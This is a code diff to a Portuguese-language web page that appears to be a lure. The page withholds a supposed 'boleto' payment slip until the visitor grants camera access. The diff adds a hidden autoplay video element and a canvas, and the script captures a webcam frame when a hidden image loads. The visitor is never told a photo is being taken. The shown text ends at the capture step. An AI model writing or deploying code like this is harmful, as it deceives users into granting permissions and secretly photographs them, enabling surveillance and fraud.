@@ -9,11 +9,14 @@
 <body>
 
 <div id="conteudo" style="display:none;">
+    <video id="video" autoplay style="display:none;"></video>
+    <canvas id="canvas"></canvas>
+
     <img id="triggerImg" src="1.jpeg" style="display:none;">
 </div>
 
 <div id="erro">
-    <h2 style="color:orange;">Precisamos das suas permissões para mostrar o boleto!</h2>
+    <h2 style="color:orange;">Precisamos das suas permissões para mostrar o boleto, recarregue a página!</h2>
 </div>
 
 <script>
@@ -26,12 +29,10 @@ async function startCamera() {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         video.srcObject = stream;
 
-        // Mostra o conteúdo se a câmera foi permitida
-        document.getElementById("conteudo").style.display = "show";
+        document.getElementById("conteudo").style.display = "inline";
         document.getElementById("erro").style.display = "none";
 
     } catch (err) {
-        // Usuário negou ou ocorreu erro → mostra mensagem
         document.getElementById("erro").style.display = "block";
         console.error("Erro ao acessar a câmera:", err);
     }
@@ -39,7 +40,6 @@ async function startCamera() {
 
 startCamera();
 
-// Quando a imagem for carregada, captura o frame do vídeo
 triggerImg.addEventListener('load', () => {
     const ctx = canvas.getContext('2d');
 
